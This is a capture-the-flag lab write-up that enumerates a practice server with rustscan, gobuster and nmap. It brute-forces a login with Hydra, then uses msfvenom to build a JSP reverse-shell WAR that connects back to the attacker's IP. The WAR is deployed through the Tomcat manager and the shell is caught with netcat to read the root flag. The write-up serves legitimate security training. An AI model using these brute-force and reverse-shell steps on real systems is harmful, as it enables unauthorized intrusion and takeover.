## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.  

This room will introduce you to the following tools: 

- Dirbuster
- Hydra
- Nmap
- Nikto
- Metasploit

If you are stuck at any point, each tool has a respective room or module linked above.
```

## IP-Address
```IP-Address
10.10.84.50
```
## Rustscan
```bash
rustscan -a 10.10.84.50 -b 450 -t 2000 --ulimit -- -e tun0 -Pn
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 60
80/tcp   open  http    syn-ack ttl 60
1234/tcp open  hotline syn-ack ttl 60 //tomcat server
8009/tcp open  ajp13   syn-ack ttl 60
```


## Gobuster
```bash
 gobuster dir -u http://10.10.84.50/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t4  -x php,txt,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.84.50/
[+] Method:                  GET
[+] Threads:                 4
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/guidelines           (Status: 301) [Size: 315] 
/protected            (Status: 401) [Size: 458]
```



## Web Application at IP-Address/guidelines

```Message
Hey bob, did you update that TomCat server?
```

## Login Page at /protected
```bash 
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.84.50 http-get /protected

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-20 15:20:51
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.84.50:80/protected
[80][http-get] host: 10.10.84.50   login: bob   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-20 15:21:07
```

## Tomcat - Port 1234
```version
Apache Tomcat/7.0.88
```

## Detailed Scan
```bash
nmap
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b0:81:f0:71:33:90:c9:d6:ee:e0:3e:d9:3f:b7:7a:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQlrLVpf5xawOJ6bDcIwWl83aomQXRr0VtnR8eWAbJfHKoqnilO6M4epLE5HLepx5Fs31Y39PMb4aeY2XCS0WEDx/Yt9Ds6+pv+ANJiQoQuTbjTUDLHbB928UoqtYELeyMlpn55P25dshvtINgenWsGIG8UHrnA/gWMRO/X58xRlCVC2uMD+sFsWuJmyqYgCUHZq7ZvNrB6k8bFdHXQJ+JWxw0JdP9wHBO1rqLR4wT7rMS6+bLg9N/AarGr1qGg/NJJidE6tbgf9ltuf1KiCqnBn/f8apEwSJLsZ8E3eVs2au8yab1v2z7+uq07PpTtJlCjlWtK4fhGf4q4k4F8qGd
|   256 ba:37:bf:2b:aa:81:4d:d8:ed:75:9b:ce:5b:0d:4c:31 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBKXQN1a4XGJcrIPyyW2VrqyAd9sFg0h13pg8IoxWKPOJBtucXY/50Q+Ml1z4bL3mcvL3twCdLWBv41mpEgIP3w=
|   256 74:30:30:cb:d2:8b:60:15:04:1a:76:09:a1:e5:e7:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVEFD7UWbjuXm+Pw9xOOBD1kQTVvCIS1cG0Z/QhPhJh
80/tcp   open  http    syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    syn-ack ttl 60 Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
8009/tcp open  ajp13   syn-ack ttl 60 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/20%OT=22%CT=%CU=34147%PV=Y%DS=5%DC=T%G=N%TM=687D4344
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)SEQ(
OS:SP=FE%GCD=1%ISR=111%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW
OS:7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%
OS:W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508N
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.020 days (since Sun Jul 20 14:58:45 2025)
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8009/tcp)
HOP RTT       ADDRESS
1   49.07 ms  10.17.0.1
2   ... 4
5   172.73 ms 10.10.84.50

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:28
Completed NSE at 15:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:28
Completed NSE at 15:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:28
Completed NSE at 15:28, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.52 seconds
           Raw packets sent: 67 (4.600KB) | Rcvd: 288 (85.220KB)
```

## Web Interaction 
```Web
http://10.10.84.50:1234/manager/html 
login user = bob
password =  [password omitted]
and i got 5 docum0 
```


## Msfvenom 
#msfvenon_command
```Reverse Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.17.36.74 LPORT=4444 -f war -o shell.war

Payload size: 1100 bytes
Final size of war file: 1100 bytes
Saved as: shell.war
```

Upload on http://10.10.84.50:1234/manager/html
and then visit http://10.10.84.50:1234/shell/
Then Got the Reverse shell
## Flag
```bash
nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.10.84.50] 43152
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
cd root
ls
flag.txt
snap
cat flag.txt
[flag/hash omitted]

```